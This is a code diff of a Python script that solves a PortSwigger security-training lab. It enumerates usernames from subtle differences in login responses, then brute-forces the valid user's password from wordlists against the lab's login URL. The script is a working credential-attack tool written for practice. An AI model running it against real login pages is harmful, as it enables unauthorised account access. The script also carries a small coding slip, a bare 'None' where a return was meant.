@@ -2,9 +2,9 @@
 #
 # Author: Ahmed Elqalawii
 #
-# Date: 25/8/2023
+# Date: 26/8/2023
 #
-# PortSwigger LAB: Username enumeration via different responses
+# PortSwigger LAB: Username enumeration via subtly different responses
 #
 # Steps: 1. enum usernames to get a valid one
 #        2. brute force the valid username password
@@ -18,7 +18,7 @@ import time
 from colorama import Fore
 
 # change this to your lab URL
-url = "https://0a20003b049712f885c31a4200d50024.web-security-academy.net/login"
+url = "https://0a85003b038f5b6682ba570200920076.web-security-academy.net/login"
 # change the paths to your lists
 usernames = open("/home/ahmed/users", 'rt').read().splitlines()
 passwords = open("/home/ahmed/passwords",
@@ -31,6 +31,17 @@ FAILED_USERS = []
 FAILED_USERS_COUNTER = 0
 FAILED_PASSWORDS = []
 FAILED_PASSWORDS_COUNTER = 0
+
+
+#####################################
+# Function to a pattern from a text
+#####################################
+def extract_pattern(pattern, text):
+    exist = re.findall(pattern, text)
+    if len(exist) != 0:
+        return exist[0]
+    else:
+        return None
 
 
 #####################################
@@ -47,12 +58,12 @@ def print_progress(elapsed_time, fail_counter, success_counter, total_counts, te
 def get_valid_user(start_time, url, usernames):
     global FAILED_USERS
     global FAILED_USERS_COUNTER
-    print(Fore.WHITE + "[#] Enumerate usernames..")
     total_users = len(usernames)  # number of all usernames
-    for index, user in enumerate(usernames):
+    print(Fore.WHITE + "[#] Enumerate usernames..")
+    for (index, user) in enumerate(usernames):
         data = {
             "username": user,
-            "password": "no important now"
+            "password": "not important"
         }
         # calculate elapsed time
         elapsed_time = (int((time.time() - start_time) / 60))
@@ -60,20 +71,20 @@ def get_valid_user(start_time, url, usernames):
         print_progress(elapsed_time, FAILED_USERS_COUNTER,
                        index, total_users, user)
         try:  # try to send a login request
-            response = requests.post(
-                url, data, allow_redirects=False, timeout=5)
-            if response.status_code == 200:
-                check_pattern = re.findall(
-                    "Invalid username", response.text)  # search for pattern
-                if len(check_pattern) == 0:  # if pattern not found
-                    return user  # valid user
-                else:
-                    continue
+            res = requests.post(url, data)
+            pattern1 = extract_pattern("<!-- -->", res.text)
+            pattern2 = extract_pattern("password\.", res.text)
+            # not every labs has the same compinations of these two patterns
+            # adjust the next condition to your lab (e.g. pattern1 = some text & pattern2 = None )
+            if pattern1 == None and pattern2 == None:
+                return user
+            else:
+                pass
         except:
             FAILED_USERS_COUNTER += 1  # update the fail counter
             # save the failed username to try it later
             FAILED_USERS.append(user)
-    return None
+    None
 
 
 ##################################
@@ -82,6 +93,7 @@ def get_valid_user(start_time, url, usernames):
 def brute_force_password(start_time, url, valid_user, passwords):
     global FAILED_PASSWORDS
     global FAILED_PASSWORDS_COUNTER
+    print("")
     print(Fore.WHITE + "[#] Brute forcing password..")
     print(Fore.GREEN + "✅ Valid user: " + valid_user)
     total_passwords = len(passwords)  # number of all passwords
@@ -139,9 +151,10 @@ def save_results(elapsed_time, file_name, valid_user, valid_password):
 start_time = time.time()  # capture the time before enumeration
 valid_user = get_valid_user(
     start_time, url, usernames)  # start the enumeration
-if valid_user != None:  # if a valid username was found
+
+if valid_user != None:
     valid_password = brute_force_password(
-        start_time, url, valid_user, passwords)  # brute force his password
+        start_time, url, valid_user, passwords)
     if valid_password != None:  # if a valid password was found
         elapsed_time = int((time.time() - start_time) /
                            60)  # calculate elapsed time
